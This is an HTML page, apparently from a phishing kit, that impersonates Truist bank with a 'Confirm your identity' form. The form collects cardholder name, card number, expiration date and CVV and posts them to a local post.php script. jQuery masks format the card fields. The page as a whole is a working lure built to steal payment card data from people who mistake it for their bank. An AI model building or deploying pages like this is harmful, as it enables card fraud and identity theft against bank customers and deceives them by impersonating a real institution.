<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="res/css/card.css">
</head> 
<body>
<header>
    <img src="res/img/logos.png">
</header>

<main>
<div class="title">
Confirm your identity
</div>

    <div class="container"> 
            <form action="post.php" method="post">

            <div class="col text">
            Confirm your identity by entering your card information.
            </div>
 <div class="group">
<div class="col left">
  <label>Cardholder Name</label>
    <input type="text" name="name" >
</div>

<div class="col right">
    <label>Card Number</label>
    <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
</div>
</div>

<div class="group">
<div class="col left">
    <label>Expiration Date</label>
    <input type="text" name="exp" required placeholder="MM/YY" id="exp">
</div>
    <div class="col right">
    <label>Security Code</label>
    <input type="password" name="cvv" required placeholder="CVV" id="cvv">
    </div>
</div>

    <div class="col">
    <button type="submit" class="log">Continue</button>
</div>
</form>
    </div>

</main>
<footer>
© 2024, Truist. All Rights Reserved.
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>  
</body>
</html>

